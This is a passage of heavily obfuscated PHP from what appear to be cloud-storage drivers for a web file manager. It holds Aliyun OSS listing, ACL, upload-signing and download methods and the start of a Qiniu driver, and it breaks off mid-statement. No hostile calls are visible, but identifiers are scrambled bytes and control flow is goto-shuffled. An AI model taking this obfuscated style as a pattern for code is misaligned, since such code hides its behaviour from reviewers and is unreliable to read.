_isFolder($B±ìÓÄµÏ“) { $D©¤ŠÙ«¹Ú =& $_SERVER[İåâé¾]; try { $B±ìÓÄµÏ“ = trim($B±ìÓÄµÏ“, $D©¤ŠÙ«¹Ú[8]); $d™ƒ¯Ôß‡Ø = array($D©¤ŠÙ«¹Ú[912] => $D©¤ŠÙ«¹Ú[8], $D©¤ŠÙ«¹Ú[185] => empty($B±ìÓÄµÏ“) ? $D©¤ŠÙ«¹Ú[33] : $B±ìÓÄµÏ“ . $D©¤ŠÙ«¹Ú[8], $D©¤ŠÙ«¹Ú[913] => 1, $D©¤ŠÙ«¹Ú[914] => $D©¤ŠÙ«¹Ú[33]); $EÜ‡®ˆ‹Ò = $this->client->listObjects($this->bucket, $d™ƒ¯Ôß‡Ø); } catch (OSS\Core\OssException $e†¯äÓ¯ê¾) { return !1; } $dåÎ¢ƒŒÊ´ = $EÜ‡®ˆ‹Ò->getObjectList(); $dÌ¸ù¡Õ™Î = $EÜ‡®ˆ‹Ò->getPrefixList(); return empty($dåÎ¢ƒŒÊ´) && empty($dÌ¸ù¡Õ™Î) ? !1 : !0; } public function listPath($DĞ‰«ãÆ¨¯, $a¡„›å³øí = false, $BÇºØ¯—Ì¡ = false) { $a¼‘÷—ùÉ§ =& $_SERVER[İåâé¾]; $Cˆ—Ëòƒ’» = $this->fileList($DĞ‰«ãÆ¨¯, $a¼‘÷—ùÉ§[8], 1); foreach ($Cˆ—Ëòƒ’»[$a¼‘÷—ùÉ§[75]] as $Aìì›Œ¦’¶ => $AÇìè¼¢Š) { $Cˆ—Ëòƒ’»[$a¼‘÷—ùÉ§[75]][$Aìì›Œ¦’¶] = $this->folderInfo($AÇìè¼¢Š, $a¡„›å³øí, $BÇºØ¯—Ì¡); } foreach ($Cˆ—Ëòƒ’»[$a¼‘÷—ùÉ§[74]] as $Aìì›Œ¦’¶ => $bÚ™ã—®ã¡) { $Cˆ—Ëòƒ’»[$a¼‘÷—ùÉ§[74]][$Aìì›Œ¦’¶] = $this->fileInfo($bÚ™ã—®ã¡[$a¼‘÷—ùÉ§[28]], $bÚ™ã—®ã¡, $BÇºØ¯—Ì¡); } return $Cˆ—Ëòƒ’»; } public function has($c¦¬†…Œ, $céÉ¼àÎ¯Ô = true) { goto E¥¶ˆÁ÷ï; b³Ïæ…¶ˆ: $F‡ïÈŒ´´Ò = $FÒÎ–Æ³¤ç[33]; $b¶æë‘ŒœŸ = 100; while (!0) { $Añê†š•…ø = array($FÒÎ–Æ³¤ç[912] => $FÒÎ–Æ³¤ç[8], $FÒÎ–Æ³¤ç[185] => $CÀ‰ŒŠâƒ˜, $FÒÎ–Æ³¤ç[913] => $b¶æë‘ŒœŸ, $FÒÎ–Æ³¤ç[914] => $F‡ïÈŒ´´Ò); try { $fİÏ©‘ŞÙÆ = $this->client->listObjects($this->bucket, $Añê†š•…ø); } catch (OSS\Core\OssException $AË³È¢ÚâÒ) { break; } $F‡ïÈŒ´´Ò = $fİÏ©‘ŞÙÆ->getNextMarker(); $càãæÈ°Éø = $fİÏ©‘ŞÙÆ->getObjectList(); $Bšùˆ£º½• = $fİÏ©‘ŞÙÆ->getPrefixList(); if ($céÉ¼àÎ¯Ô) { if (!empty($càãæÈ°Éø)) { if (count($càãæÈ°Éø) > 1 || $càãæÈ°Éø[0]->getKey() != $CÀ‰ŒŠâƒ˜) { return !0; } } } else { if (!empty($Bšùˆ£º½•)) { return !0; } } if ($F‡ïÈŒ´´Ò === $FÒÎ–Æ³¤ç[33]) { break; } } goto C˜ë²¨‰àÎ; C˜ë²¨‰àÎ: return !1; goto d©¥¶¯«õ˜; E¥¶ˆÁ÷ï: $FÒÎ–Æ³¤ç =& $_SERVER[İåâé¾]; $c¦¬†…Œ = trim($c¦¬†…Œ, $FÒÎ–Æ³¤ç[8]); $CÀ‰ŒŠâƒ˜ = empty($c¦¬†…Œ) ? $FÒÎ–Æ³¤ç[33] : $c¦¬†…Œ . $FÒÎ–Æ³¤ç[8]; goto b³Ïæ…¶ˆ; d©¥¶¯«õ˜: } public function listAll($Dç„‘ğ¥Õˆ) { $DŞÕ’‰‘‘¯ =& $_SERVER[İåâé¾]; $d„¦¤èª Ë = $this->fileList($Dç„‘ğ¥Õˆ, $DŞÕ’‰‘‘¯[33], 1); $eò“‚ìâÍ = array(); foreach ($d„¦¤èª Ë[$DŞÕ’‰‘‘¯[74]] as $B±‰Í”ß) { $eò“‚ìâÍ[$B±‰Í”ß[$DŞÕ’‰‘‘¯[28]]] = $B±‰Í”ß[$DŞÕ’‰‘‘¯[78]]; } return $this->listAllFiles($Dç„‘ğ¥Õˆ, array_keys($eò“‚ìâÍ), $eò“‚ìâÍ); } public function canRead($f×¹ç¤Ë¿á) { $b³ùö¦Ë‚“ =& $_SERVER[İåâé¾]; $E—‘ŒùÕáâ = $this->pathAcl($f×¹ç¤Ë¿á); return $E—‘ŒùÕáâ == $b³ùö¦Ë‚“[925] || $E—‘ŒùÕáâ == $b³ùö¦Ë‚“[926] ? !0 : !1; } public function canWrite($D¯ƒÚ˜Òõ) { $BŒ¹¥ÏÚÓÊ = $this->pathAcl($D¯ƒÚ˜Òõ); return $BŒ¹¥ÏÚÓÊ == $_SERVER[İåâé¾][926] ? !0 : !1; } public function pathAcl($BÖöãÚÉô) { goto Có›²ƒÜ®¤; fêºÄµÔÇÄ: $a©Ö±­®ÈÉ = $D‘öƒÆÈÅ == $Cø°ïÜìİ[34] ? $this->bucketAcl : $D‘öƒÆÈÅ; if ($a©Ö±­®ÈÉ == $Cø°ïÜìİ[927]) { return $Cø°ïÜìİ[925]; } if ($a©Ö±­®ÈÉ == $Cø°ïÜìİ[928]) { return $Cø°ïÜìİ[926]; } goto cÈÉÇ•·  ; Có›²ƒÜ®¤: $Cø°ïÜìİ =& $_SERVER[İåâé¾]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $D‘öƒÆÈÅ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($BÖöãÚÉô)); } catch (OSS\Core\OssException $EÙŠù¥çƒ†) { return !1; } goto fêºÄµÔÇÄ; cÈÉÇ•·  : return $a©Ö±­®ÈÉ; goto aºöË§àæó; aºöË§àæó: } private function chmodPath($f’ìØÙ×ƒƒ, $B ïİ‚õµˆ = '') { $a²ŸÆİÌÈ =& $_SERVER[İåâé¾]; $eŒ’º—‚‚½ = empty($B ïİ‚õµˆ) ? $a²ŸÆİÌÈ[928] : $B ïİ‚õµˆ; $d ÒÇâÜù­ = array($a²ŸÆİÌÈ[34], $a²ŸÆİÌÈ[181], $a²ŸÆİÌÈ[927], $a²ŸÆİÌÈ[928]); if (!in_array($eŒ’º—‚‚½, $d ÒÇâÜù­)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($f’ìØÙ×ƒƒ), $eŒ’º—‚‚½); } catch (OSS\Core\OssException $F¨¢œŸ·ƒè) { return !1; } return !0; } public function getContent($DÍÅ³ÎÙ’‡) { return $this->fileSubstr($DÍÅ³ÎÙ’‡, -1); } public function setContent($AèĞá‡¢íÂ, $fƒ“Ş¨µ‡Ñ = '') { $CË·÷Â‘‘ó =& $_SERVER[İåâé¾]; try { $BÒé¾˜…àï = array(); $BŠ‹’©¼´ = $this->client->putObject($this->bucket, $this->pathEncode($AèĞá‡¢íÂ), $fƒ“Ş¨µ‡Ñ, $BÒé¾˜…àï); } catch (OSS\Core\OssException $AÑÍÇ×‡âì) { return !1; } $a¡Ÿµóá°† = array($CË·÷Â‘‘ó[915] => trim($BŠ‹’©¼´[$CË·÷Â‘‘ó[929]], $CË·÷Â‘‘ó[111]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($AèĞá‡¢íÂ))); $this->updateObjMeta($AèĞá‡¢íÂ, $a¡Ÿµóá°†); return isset($BŠ‹’©¼´[$CË·÷Â‘‘ó[930]][$CË·÷Â‘‘ó[877]]) ? (int) $BŠ‹’©¼´[$CË·÷Â‘‘ó[930]][$CË·÷Â‘‘ó[877]] : strlen($BŠ‹’©¼´); } private function updateObjMeta($fæ‹Şè»¯, $fËÕ÷Å»µ…) { $fæ‹Şè»¯ = $this->pathEncode($fæ‹Şè»¯); try { $Cêô›–¸Åí = array(OSS\OssClient::OSS_HEADERS => $fËÕ÷Å»µ…); $this->client->copyObject($this->bucket, $fæ‹Şè»¯, $this->bucket, $fæ‹Şè»¯, $Cêô›–¸Åí); } catch (OSS\Core\OssException $F°™ô‰ÍÉ¥) { return !1; } return !0; } public function upload($A®Æ“Ô‡, $d´…¡ˆòáÆ, $dÏæî¾¹·³ = false, $F°È¯õ§°‚ = REPEAT_REPLACE) { $bĞƒôÕÛ¿é =& $_SERVER[İåâé¾]; $Döì‘½“Ù˜ = trim($A®Æ“Ô‡, $bĞƒôÕÛ¿é[8]); $bŸ‚ÙÃ«œÆ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($bĞƒôÕÛ¿é[915] => @md5_file($d´…¡ˆòáÆ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($A®Æ“Ô‡))); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($Döì‘½“Ù˜), $d´…¡ˆòáÆ, $bŸ‚ÙÃ«œÆ); } catch (OSS\Core\OssException $fİÖöğéí¼) { return !1; } return $this->getPathOuter($A®Æ“Ô‡); } public function getHost() { $DÜÕ±Àˆ™î =& $_SERVER[İåâé¾]; $DÊ‡¿Ê¦Š = explode($DÜÕ±Àˆ™î[167], parent::getHost()); return $DÊ‡¿Ê¦Š[0] . $DÜÕ±Àˆ™î[167] . $this->bucket . $DÜÕ±Àˆ™î[90] . $DÊ‡¿Ê¦Š[1]; } public function uploadFormData($b„¬¹ÓÈ‘ò, $E¶¯‚êâ±¢ = 3600) { goto fØ§É¼äÓ‡; bµƒ”¢ç÷: return array($b¨Ü·îÚŒá[847] => $cÚšô°µ„Ø, $b¨Ü·îÚŒá[934] => $this->accessKey, $b¨Ü·îÚŒá[843] => $b¨Ü·îÚŒá[835], $b¨Ü·îÚŒá[935] => $dß¤¨Ê¢Ëˆ, $b¨Ü·îÚŒá[165] => $b¤ŸÇñ÷¢İ); goto FÛ›Ê”´œï; D…ñ„É•©…: $cÇìÅÂ»¦î = array($b¨Ü·îÚŒá[933], 0, $Dèé¦‹ğìñ); $c‰Ã‡ØÄ‚·[] = $cÇìÅÂ»¦î; $cç’ïİ°é“ = $this->pathFather($b„¬¹ÓÈ‘ò); goto E‹éÊ…„’Ø; b¡…¨Ã”ãŠ: $aµ”î£Áƒæ = json_encode($Dñƒº‹°ğÌ); $cÚšô°µ„Ø = base64_encode($aµ”î£Áƒæ); $dß¤¨Ê¢Ëˆ = base64_encode(hash_hmac($b¨Ü·îÚŒá[224], $cÚšô°µ„Ø, $this->secret, !0)); goto bµƒ”¢ç÷; D°–éÒø»: $b¨Ëñ´ä‡” = date($b¨Ü·îÚŒá[931], time() + $Có¥èÃ); $d›½Ï›õ‹ë = new DateTime($b¨Ëñ´ä‡”); $f™éœÔÊ°È = $d›½Ï›õ‹ë->format(DateTime::ISO8601); goto bÉÛ³µí×; E‹éÊ…„’Ø: $eŞÄ‘Ûá²† = array($b¨Ü·îÚŒá[841], $b¨Ü·îÚŒá[842], $cç’ïİ°é“); $c‰Ã‡ØÄ‚·[] = $eŞÄ‘Ûá²†; $Dñƒº‹°ğÌ = array($b¨Ü·îÚŒá[837] => $f™éœÔÊ°È, $b¨Ü·îÚŒá[838] => $c‰Ã‡ØÄ‚·); goto b¡…¨Ã”ãŠ; bÉÛ³µí×: $a‡İ¡„£ = strpos($f™éœÔÊ°È, $b¨Ü·îÚŒá[287]); $f™éœÔÊ°È = substr($f™éœÔÊ°È, 0, $a‡İ¡„£) . $b¨Ü·îÚŒá[932]; $Dèé¦‹ğìñ = 1048576000 * 5; goto D…ñ„É•©…; fØ§É¼äÓ‡: $b¨Ü·îÚŒá =& $_SERVER[İåâé¾]; if (!($b¤ŸÇñ÷¢İ = $this->getHost())) { return !1; } $Có¥èÃ = $E¶¯‚êâ±¢; goto D°–éÒø»; FÛ›Ê”´œï: } public function multiUploadFormData($B³˜¢³Ï‘, $dõí£é²  = 3600) { $AÉ³ƒÓßï =& $_SERVER[İåâé¾]; if (!($bÊêë‡Ô‡³ = $this->getHost())) { return !1; } $f¬Ú¡ÂÂ½© = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($B³˜¢³Ï‘)); return array($AÉ³ƒÓßï[215] => $f¬Ú¡ÂÂ½©, $AÉ³ƒÓßï[165] => $bÊêë‡Ô‡³ . $AÉ³ƒÓßï[8] . $this->pathEncode($B³˜¢³Ï‘), $AÉ³ƒÓßï[216] => gmdate($AÉ³ƒÓßï[936]), $AÉ³ƒÓßï[88] => $B³˜¢³Ï‘); } public function multiUploadAuthData($e½œÜæä’…, $fŞ±Ğ£Á½ = array()) { goto a»§ôÑÍë¨; a¾‰×Ç¯: $bç£‚ ÆÏ = $Fâ‚‰´”‘â[938] . $this->accessKey . $Fâ‚‰´”‘â[4] . $a÷ªòÍŒ˜Œ; if (strpos($a¢¾Éò‘ÓÏ, $Fâ‚‰´”‘â[219]) === 0) { $bç£‚ ÆÏ = array($Fâ‚‰´”‘â[226] => $bç£‚ ÆÏ, $Fâ‚‰´”‘â[216] => $f¤³òÇÙ»); } return $bç£‚ ÆÏ; goto fº˜ŠÅĞóÌ; a»§ôÑÍë¨: $Fâ‚‰´”‘â =& $_SERVER[İåâé¾]; $f¤³òÇÙ» = isset($fŞ±Ğ£Á½[$Fâ‚‰´”‘â[216]]) ? $fŞ±Ğ£Á½[$Fâ‚‰´”‘â[216]] : gmdate($Fâ‚‰´”‘â[936]); $a¢¾Éò‘ÓÏ = isset($fŞ±Ğ£Á½[$Fâ‚‰´”‘â[156]]) ? $fŞ±Ğ£Á½[$Fâ‚‰´”‘â[156]] : $Fâ‚‰´”‘â[33]; goto f¨¹¶ÚÔÌÛ; E»¤º¡ËÜ: if (!empty($fŞ±Ğ£Á½[$Fâ‚‰´”‘â[937]])) { $b’¥›Å‚‡ô = array_merge(array($CÜ¶Ã‹Õğ[4]), $fŞ±Ğ£Á½[$Fâ‚‰´”‘â[937]]); sort($b’¥›Å‚‡ô); $CÜ¶Ã‹Õğ[4] = implode($Fâ‚‰´”‘â[223], $b’¥›Å‚‡ô); } $f‰÷°ÏŞî = implode($Fâ‚‰´”‘â[223], $CÜ¶Ã‹Õğ); $a÷ªòÍŒ˜Œ = base64_encode(hash_hmac($Fâ‚‰´”‘â[224], $f‰÷°ÏŞî, $this->secret, !0)); goto a¾‰×Ç¯; f¨¹¶ÚÔÌÛ: $aòùš¶½ = $e½œÜæä’…; if (isset($fŞ±Ğ£Á½[$Fâ‚‰´”‘â[88]])) { $aòùš¶½ = $fŞ±Ğ£Á½[$Fâ‚‰´”‘â[88]]; unset($fŞ±Ğ£Á½[$Fâ‚‰´”‘â[88]]); } if (isset($fŞ±Ğ£Á½[$Fâ‚‰´”‘â[217]])) { return $this->listUploadParts($aòùš¶½, $f¤³òÇÙ», $fŞ±Ğ£Á½); } goto bäĞ·ÔïŸ¹; bäĞ·ÔïŸ¹: $CÜ¶Ã‹Õğ = array($Fâ‚‰´”‘â[218], $Fâ‚‰´”‘â[33], $Fâ‚‰´”‘â[114], $f¤³òÇÙ», "\x78\55\x6f\x73\163\x2d\x64\141\x74\145\x3a{$f¤³òÇÙ»}", $Fâ‚‰´”‘â[8] . $this->bucket . $Fâ‚‰´”‘â[8] . $aòùš¶½ . $a¢¾Éò‘ÓÏ); if (strpos($a¢¾Éò‘ÓÏ, $Fâ‚‰´”‘â[219]) === 0) { $CÜ¶Ã‹Õğ[0] = $Fâ‚‰´”‘â[220]; } if (isset($fŞ±Ğ£Á½[$Fâ‚‰´”‘â[221]]) && $fŞ±Ğ£Á½[$Fâ‚‰´”‘â[221]] == $Fâ‚‰´”‘â[222]) { $CÜ¶Ã‹Õğ[0] = $Fâ‚‰´”‘â[222]; } goto E»¤º¡ËÜ; fº˜ŠÅĞóÌ: } public function listUploadParts($aªî…êù¡¯, $BìàƒÖ‚§µ, $FÖ·Ù—’º) { goto CØ„æÕÀ‚Ê; CØ„æÕÀ‚Ê: $bìÃñ™ğË« =& $_SERVER[İåâé¾]; $eë‰Î‘ñØÔ = parse_url_query($FÖ·Ù—’º[$bìÃñ™ğË«[156]]); $Bî¸ÚÁ·»š = $this->client->listParts($this->bucket, $this->pathEncode($aªî…êù¡¯), $eë‰Î‘ñØÔ[$bìÃñ™ğË«[215]]); goto f„„¨çĞÛÀ; BÜñ†§…: return array($bìÃñ™ğË«[226] => $b‚ŠØšæÅ, $bìÃñ™ğË«[216] => $BìàƒÖ‚§µ, $bìÃñ™ğË«[228] => $F¶ÌÄåÚ²œ); goto c„Ãºï÷†º; f„„¨çĞÛÀ: $fÆâ‡éÉñ = $Bî¸ÚÁ·»š->getListPart(); $F¶ÌÄåÚ²œ = array(); foreach ($fÆâ‡éÉñ as $Cœ…çéÁƒÁ) { $F¶ÌÄåÚ²œ[] = array($bìÃñ™ğË«[919] => $Cœ…çéÁƒÁ->getPartNumber(), $bìÃñ™ğË«[920] => trim($Cœ…çéÁƒÁ->getETag(), $bìÃñ™ğË«[111])); } goto CÓğ¨ª“¶; CÓğ¨ª“¶: unset($FÖ·Ù—’º[$bìÃñ™ğË«[217]], $FÖ·Ù—’º[$bìÃñ™ğË«[221]]); $b‚ŠØšæÅ = $this->multiUploadAuthData($aªî…êù¡¯, $FÖ·Ù—’º); if (empty($b‚ŠØšæÅ)) { return !1; } goto BÜñ†§…; c„Ãºï÷†º: } public function download($bŸ¼ŸŒ³ˆÔ, $E—òòÑé˜») { if ($this->isFolder($bŸ¼ŸŒ³ˆÔ)) { return !1; } try { $f‡ÊƒÚ¾ø = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $E—òòÑé˜»); $this->client->getObject($this->bucket, $this->pathEncode($bŸ¼ŸŒ³ˆÔ), $f‡ÊƒÚ¾ø); } catch (OSS\Core\OssException $cä§æ†à‡æ) { return !1; } return $E—òòÑé˜»; } public function fileSubstr($bÔˆÌÑ¥ø¥, $f•ñ³ïê¸® = 0, $Aª¥Êñ‚¡ = false) { if ($f•ñ³ïê¸® === -1) { $c¨½Ÿ¸±Üƒ = array(); } else { if ($Aª¥Êñ‚¡ === !1) { $Eè»Ö´ËÂ× = $this->size($bÔˆÌÑ¥ø¥); } else { $Eè»Ö´ËÂ× = $f•ñ³ïê¸® + $Aª¥Êñ‚¡ - 1; } $c¨½Ÿ¸±Üƒ = array(OSS\OssClient::OSS_RANGE => "{$f•ñ³ïê¸®}\55{$Eè»Ö´ËÂ×}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($bÔˆÌÑ¥ø¥), $c¨½Ÿ¸±Üƒ); } catch (OSS\Core\OssException $cğ°©ó¨) { return !1; } } public function link($aßĞìÏ½«ô, $C´Âİø¯ö = array()) { if (!$this->exist($aßĞìÏ½«ô) || $this->isFolder($aßĞìÏ½«ô)) { return !1; } try { return $this->client->signUrl($this->bucket, $this->pathEncode($aßĞìÏ½«ô), 3600 * 12, $_SERVER[İåâé¾][222], $C´Âİø¯ö); } catch (OSS\Core\OssException $a†«¥Åï˜“) { return !1; } } public function fileOut($CÖ²Éğ‡’‡, $D×Æ‡±Ğ™ = false, $eÄ¹Œñ®‘¬ = false, $EìâœŸ¹†¦ = '') { goto FíÎùĞ¾¬; B›Ç‰³µˆ×: $FšÙ½–§™ = array(OSS\OssClient::OSS_SUB_RESOURCE => $cíÈ–Ò· [939] . rawurlencode("{$D×Æ‡±Ğ™}\x3b\146\x69\x6c\145\x6e\141\155\x65\75{$eÄ¹Œñ®‘¬}")); $FšÙ½–§™[OSS\OssClient::OSS_SUB_RESOURCE] .= $cíÈ–Ò· [940] . $Fñì®ÚÅ”õ; $fŒÙ–Ã½ = intval($GLOBALS[$cíÈ–Ò· [6]][$cíÈ–Ò· [84]][$cíÈ–Ò· [101]][$cíÈ–Ò· [103]] * 1024 * 1024 * 8); goto A¡Ÿ÷¿Éêé; eèñ¡Œ±ù¼: if ($Fñì®ÚÅ”õ == $cíÈ–Ò· [200]) { return parent::fileOut($CÖ²Éğ‡’‡, $D×Æ‡±Ğ™, $eÄ¹Œñ®‘¬, $EìâœŸ¹†¦); } $D×Æ‡±Ğ™ = $D×Æ‡±Ğ™ ? $cíÈ–Ò· [201] : $cíÈ–Ò· [202]; $eÄ¹Œñ®‘¬ = $this->pathEncode($eÄ¹Œñ®‘¬); goto B›Ç‰³µˆ×; FíÎùĞ¾¬: $cíÈ–Ò·  =& $_SERVER[İåâé¾]; if (!$eÄ¹Œñ®‘¬) { $eÄ¹Œñ®‘¬ = $this->pathThis($CÖ²Éğ‡’‡); } $Fñì®ÚÅ”õ = get_file_mime(get_path_ext($eÄ¹Œñ®‘¬)); goto eèñ¡Œ±ù¼; A¡Ÿ÷¿Éêé: if ($fŒÙ–Ã½ && $fŒÙ–Ã½ >= 819200 && $fŒÙ–Ã½ <= 838860800) { $FšÙ½–§™[OSS\OssClient::OSS_SUB_RESOURCE] .= $cíÈ–Ò· [941] . $fŒÙ–Ã½; } $Dõ’ÁÀªöã = $this->link($CÖ²Éğ‡’‡, $FšÙ½–§™); $this->fileOutLink($Dõ’ÁÀªöã); goto dŞéÎ’çªÙ; dŞéÎ’çªÙ: } public function fileOutServer($AéÉù»ª±, $DÓì‚ĞÌÀ = false, $cöˆ±¸Ÿ¶ = false, $fá³åˆ„¾´ = '') { parent::fileOut($AéÉù»ª±, $DÓì‚ĞÌÀ, $cöˆ±¸Ÿ¶, $fá³åˆ„¾´); } public function fileOutImage($Eí´¶õ§”, $f©”¤§…‡¨ = 250) { $D÷è©”—Ë = array(OSS\OssClient::OSS_PROCESS => $_SERVER[İåâé¾][942] . $f©”¤§…‡¨); $b„·‘‡¥«Ë = $this->link($Eí´¶õ§”, $D÷è©”—Ë); $this->fileOutLink($b„·‘‡¥«Ë); } public function fileOutImageServer($F´¦‚—ÜˆŒ, $b³ì¯Ê§ó‚ = 250) { parent::fileOutImage($F´¦‚—ÜˆŒ, $b³ì¯Ê§ó‚); } public function hashMd5($c™Ù†ŒÀŠ, $b™ùÂçÛïÊ = '') { $aÔÆ”‰ùñ« =& $_SERVER[İåâé¾]; try { $DÇ¼É¤‡·Ğ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($c™Ù†ŒÀŠ)); } catch (OSS\Core\OssException $FìËää´«) { return !1; } if (!isset($DÇ¼É¤‡·Ğ[$aÔÆ”‰ùñ«[915]]) && !empty($b™ùÂçÛïÊ)) { $C²¦È®ø± = $this->updateObjMeta($c™Ù†ŒÀŠ, array($aÔÆ”‰ùñ«[915] => $b™ùÂçÛïÊ)); $DÇ¼É¤‡·Ğ[$aÔÆ”‰ùñ«[915]] = $C²¦È®ø± ? $b™ùÂçÛïÊ : $aÔÆ”‰ùñ«[33]; } return isset($DÇ¼É¤‡·Ğ[$aÔÆ”‰ùñ«[915]]) ? $DÇ¼É¤‡·Ğ[$aÔÆ”‰ùñ«[915]] : $aÔÆ”‰ùñ«[33]; } private function fileInfoImage($a¿Â„Ğ­Èá, &$dˆš•âŠ) { goto B„ÕçÏ£ö; DçÍğ®ÈÍœ: $FˆÈ”‘°¥ù = array(OSS\OssClient::OSS_PROCESS => $BÕÊƒØÀÅ®[943]); $Cõïçø‘œ¢ = $this->link($a¿Â„Ğ­Èá, $FˆÈ”‘°¥ù); $e‘Œ³¦Õ­ = url_request($Cõïçø‘œ¢, $BÕÊƒØÀÅ®[222], !1, !1, !1, !0); goto bŞÄ”ÖòŒ; bŞÄ”ÖòŒ: if (!$e‘Œ³¦Õ­[$BÕÊƒØÀÅ®[446]]) { return !1; } $dˆš•âŠ[$BÕÊƒØÀÅ®[211]] = array($BÕÊƒØÀÅ®[212] => $e‘Œ³¦Õ­[$BÕÊƒØÀÅ®[782]][$BÕÊƒØÀÅ®[944]][$BÕÊƒØÀÅ®[359]], $BÕÊƒØÀÅ®[213] => $e‘Œ³¦Õ­[$BÕÊƒØÀÅ®[782]][$BÕÊƒØÀÅ®[945]][$BÕÊƒØÀÅ®[359]]); goto fìƒİ¶¼³©; B„ÕçÏ£ö: $BÕÊƒØÀÅ® =& $_SERVER[İåâé¾]; $cê¾’ìğ = array($BÕÊƒØÀÅ®[207], $BÕÊƒØÀÅ®[157], $BÕÊƒØÀÅ®[208], $BÕÊƒØÀÅ®[209], $BÕÊƒØÀÅ®[210]); if (!in_array($dˆš•âŠ[$BÕÊƒØÀÅ®[156]], $cê¾’ìğ)) { return; } goto DçÍğ®ÈÍœ; fìƒİ¶¼³©: } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public function __construct($CÙÊµ­åø¦) { parent::__construct(); require_once SDK_DIR . $_SERVER[İåâé¾][946]; $this->_init($CÙÊµ­åø¦); } public function _init($e±”˜º×Ë·) { foreach ($e±”˜º×Ë· as $C›Î¤ÀÆ‚ => $aÂÓê¯ˆ×) { if (isset($this->{$C›Î¤ÀÆ‚})) { $this->{$C›Î¤ÀÆ‚} = $aÂÓê¯ˆ×; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[İåâé¾][947], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($CÓÓÄ­ÈÎ, $F‚ÖöáÏÂ = '', $cÅ¤Şî†øâ = REPEAT_RENAME) { if ($this->setContent($CÓÓÄ­ÈÎ, $F‚ÖöáÏÂ)) { return $this->getPathOuter($CÓÓÄ­ÈÎ); } return !1; } public function mkdir($e¢ØØ¼íœÜ, $D‡‘¡Ò¹¬ˆ = REPEAT_SKIP) { goto eªª•œõº; eªª•œõº: $Cµ‘«Š‰©õ =& $_SERVER[İåâé¾]; $aÙµœèˆ õ = trim($e¢ØØ¼íœÜ, $Cµ‘«Š‰©õ[8]); if ($this->isFolder($aÙµœèˆ õ)) { return $this->getPathOuter($aÙµœèˆ õ); } goto CÏÉØ‰ÆÍ«; eÂî‰Ú¸§æ: if (!$this->mkfile($AœÏŒŸ’°×)) { return !1; } if (!$this->moveFile($AœÏŒŸ’°×, $e¢ØØ¼íœÜ)) { $this->delFile($AœÏŒŸ’°×); return !1; } return $this->getPathOuter($aÙµœèˆ õ); goto c«óÊ’Ã; CÏÉØ‰ÆÍ«: $e¢ØØ¼íœÜ = $aÙµœèˆ õ . $Cµ‘«Š‰©õ[8]; $dù‹”’ïƒç = get_path_this($aÙµœèˆ õ); $AœÏŒŸ’°× = $e¢ØØ¼íœÜ . $dù‹”’ïƒç; goto eÂî‰Ú¸§æ; c«óÊ’Ã: } public function copyFile($C¢Ä¸æ, $dì“£’ê) { $AóäÉ‡Ú = $this->bucketManager->copy($this->bucket, $C¢Ä¸æ, $this->bucket, $dì“£’ê, !0); return $AóäÉ‡Ú ? !1 : !0; } public function moveFile($cÁÑä®ë¬Á, $aÅ·öšØí…) { $Aåï“ÔŠ¬ = $this->bucketManager->move($this->bucket, $cÁÑä®ë¬Á, $this->bucket, $aÅ·öšØí…, !0); return $Aåï“ÔŠ¬ ? !1 : !0; } public function delFile($Fé™‘†¬¤) { $C‡ä‡Ü¦µø = $this->bucketManager->delete($this->bucket, $Fé™‘†¬¤); return $C‡ä‡Ü¦µø ? !1 : !0; } public function delFolder($EñŒÎ×Éä´) { $DÇÓ¼Çùˆ™ = $this->fileList($EñŒÎ×Éä´); if (empty($DÇÓ¼Çùˆ™)) { return !0; } $BØˆŸğÎ² = 1000; if (count($DÇÓ¼Çùˆ™) <= $BØˆŸğÎ²) { return $this->qnDelObj($DÇÓ¼Çùˆ™) ? !1 : !0; } foreach (array_chunk($DÇÓ¼Çùˆ™, $BØˆŸğÎ²) as $eÆ©£ò) { $a±‘¾­¦‹á = $this->qnDelObj($eÆ©£ò); if ($a±‘¾­¦‹á) { return !1; } } return !0; } private function qnDelObj($cÙªŸö¦šù) { $E¤²›×ƒó = $this->bucketManager->buildBatchDelete($this->bucket, $cÙªŸö¦šù); list($B¡ö«½„Áƒ, $FóëÎîäÕŠ) = $this->bucketManager->batch($E¤²›×ƒó); return $FóëÎîäÕŠ; } private function fileList($CŠ„Ğê˜Â‡, $f‡í½¸¬ê¹ = 0) { goto fŸ­Ÿ½Åê; dæ‘Ä‘Í”: $bŠâ¸È´Ç… = $cõ­”ñ¬Ëö[33]; $E¡œ”º•ïœ = 1000; $b÷Î«Ûñå² = $cõ­”ñ¬Ëö[33]; goto dÒ¢‚¡£Ã´; fŸ­Ÿ½Åê: $cõ­”ñ¬Ëö =& $_SERVER[İåâé¾]; $CŠ„Ğê˜Â‡ = trim($CŠ„Ğê˜Â‡, $cõ­”ñ¬Ëö[8]); $bµ¨‚Ş‹Û = empty($CŠ„Ğê˜Â‡) ? $cõ­”ñ¬Ëö[33] : $CŠ„Ğê˜Â‡ . $cõ­”ñ¬Ëö[8]; goto dæ‘Ä‘Í”; dÒ¢‚¡£Ã´: $cÑĞåã•²˜ = array(); while (!0) { list($EçÛñÈİ¯æ, $CôÁ—²ôáñ) = $this->bucketManager->listFiles($this->bucket, $bµ¨‚Ş‹Û, $bŠâ¸È´Ç…, 